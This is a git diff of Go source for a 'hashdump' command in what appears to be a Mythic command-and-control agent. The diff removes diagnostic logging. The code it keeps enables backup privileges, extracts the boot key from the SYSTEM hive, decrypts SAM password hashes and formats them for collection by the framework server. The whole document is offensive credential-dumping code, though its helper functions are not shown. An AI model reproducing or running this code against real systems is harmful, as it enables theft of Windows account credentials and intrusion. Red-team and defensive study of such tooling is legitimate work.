@@ -7,7 +7,6 @@ import (
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
-	"os"
 	"strings"
 	"unsafe"
 
@@ -55,62 +54,30 @@ func (c *HashdumpCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
-	// Write diagnostic log to file — survives process crash
-	diagFile, _ := os.CreateTemp("", "hashdump-diag-*.log")
-	diagLog := func(msg string) {
-		if diagFile != nil {
-			fmt.Fprintf(diagFile, "%s\n", msg)
-			diagFile.Sync()
-		}
-	}
-	defer func() {
-		if diagFile != nil {
-			diagFile.Close()
-		}
-	}()
-	diagLog("hashdump: starting")
-
 	// Enable SeBackupPrivilege on both process and thread tokens
 	// Thread token is needed when impersonating SYSTEM via getsystem
-	if err := enableBackupPrivilege(); err != nil {
-		diagLog(fmt.Sprintf("enableBackupPrivilege: %v (non-fatal)", err))
-	} else {
-		diagLog("enableBackupPrivilege: ok")
-	}
-	if err := enableThreadBackupPrivilege(); err != nil {
-		diagLog(fmt.Sprintf("enableThreadBackupPrivilege: %v (non-fatal)", err))
-	} else {
-		diagLog("enableThreadBackupPrivilege: ok")
-	}
+	enableBackupPrivilege()
+	enableThreadBackupPrivilege()
 
 	// Step 1: Extract boot key from SYSTEM hive
-	diagLog("extractBootKey: starting")
 	bootKey, err := extractBootKey()
 	if err != nil {
-		diagLog(fmt.Sprintf("extractBootKey: FAILED: %v", err))
 		return errorf("Failed to extract boot key: %v\nEnsure you are running as SYSTEM (use 'getsystem' first).", err)
 	}
-	diagLog(fmt.Sprintf("extractBootKey: ok (len=%d)", len(bootKey)))
 	defer structs.ZeroBytes(bootKey)
 
 	// Step 2: Read SAM F value and derive hashed boot key
-	diagLog("deriveHashedBootKey: starting")
 	hashedBootKey, samRevision, err := deriveHashedBootKey(bootKey)
 	if err != nil {
-		diagLog(fmt.Sprintf("deriveHashedBootKey: FAILED: %v", err))
 		return errorf("Failed to derive hashed boot key: %v", err)
 	}
-	diagLog(fmt.Sprintf("deriveHashedBootKey: ok (rev=%d)", samRevision))
 	defer structs.ZeroBytes(hashedBootKey)
 
 	// Step 3: Enumerate user accounts and extract hashes
-	diagLog("enumerateAndDecryptUsers: starting")
 	users, err := enumerateAndDecryptUsers(hashedBootKey, samRevision)
 	if err != nil {
-		diagLog(fmt.Sprintf("enumerateAndDecryptUsers: FAILED: %v", err))
 		return errorf("Failed to enumerate users: %v", err)
 	}
-	diagLog(fmt.Sprintf("enumerateAndDecryptUsers: ok (count=%d)", len(users)))
 	defer func() {
 		for i := range users {
 			structs.ZeroString(&users[i].lmHash)
@@ -119,24 +86,15 @@ func (c *HashdumpCommand) Execute(task structs.Task) structs.CommandResult {
 	}()
 
 	if len(users) == 0 {
-		diagLog("no users found")
 		return errorResult("No user accounts found in SAM database.")
 	}
 
 	// Format output — credentials are registered via ProcessResponse hook on the server side
-	hostname, _ := os.Hostname()
-	diagLog(fmt.Sprintf("hostname: %s", hostname))
 	var sb strings.Builder
 	for _, u := range users {
 		sb.WriteString(fmt.Sprintf("%s:%d:%s:%s:::\n", u.username, u.rid, u.lmHash, u.ntHash))
 	}
-	diagLog(fmt.Sprintf("formatted: %d users, output_len=%d", len(users), sb.Len()))
-	diagLog("returning result")
 
-	// Note: Credentials are NOT sent in the agent response — Mythic's post_response
-	// protocol doesn't support inline credentials. Instead, the ProcessResponse hook
-	// in hashdump.go (agentfunctions) parses the output and registers credentials
-	// via SendMythicRPCCredentialCreate.
 	return structs.CommandResult{
 		Output:    sb.String(),
 		Status:    "success",
